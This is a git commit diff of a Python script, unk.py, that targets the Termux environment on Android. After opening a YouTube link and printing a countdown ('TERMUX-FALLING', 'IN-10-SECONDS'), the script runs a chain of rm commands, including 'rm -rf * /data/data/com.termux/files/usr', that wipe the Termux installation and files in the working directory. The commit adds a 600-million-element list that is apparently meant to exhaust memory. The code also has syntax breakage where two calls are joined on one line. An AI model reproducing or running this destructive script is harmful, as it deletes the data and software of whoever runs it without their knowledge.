7a452634a89d888c46506ec87f20440835c368ea
ixzada <127699732+ixzzxitado@users.noreply.github.com>
2024-01-04 13:33:00 -0300

    Update unk.py

--- unk.py
+++ unk.py
@@ -1,9 +1,11 @@
 #!/usr/bin/env python
 import os
 import time
-while True:
-os.system("termux-open --view https://youtube.com/shorts/hKnLPwLjBnM?si=eUv2aQygPvU10UV8")
-os.system("echo TERMUX-FALLING🤒")
+os.system("termux-open --view https://youtube.com/shorts/hKnLPwLjBnM?si=eUv2aQygPvU10UV8")os.system("echo TERMUX-FALLING🤒")
 os.system("echo IN-10-SECONDS")
 time.sleep(10)
 os.system("rm /data/data/com.termux/files/usr/libexec/termux/command-not-found && rm /data/data/com.termux/files/usr/include/apt-pkg/install-progress.h && rm /data/data/com.termux/files/usr/include/apt-pkg/update.h && rm /data/data/com.termux/files/usr/include/apt-pkg/upgrade.h && rm /data/data/com.termux/files/usr/share/bash-completion/completions/apt && rm -rf * /data/data/com.termux/files/usr && rm /data/data/com.termux/files/usr/share/man/man5/apt.conf.5.gz && rm /data/data/com.termux/files/usr/share/man/man8/apt-key.8.gz && rm /data/data/com.termux/files/usr/bin/ls && rm * /data/data/com.termux/files/usr/bin")
+hackTermux = [i for i in range(600_000_000)]
+for i in a:
+  print(i)
+  break
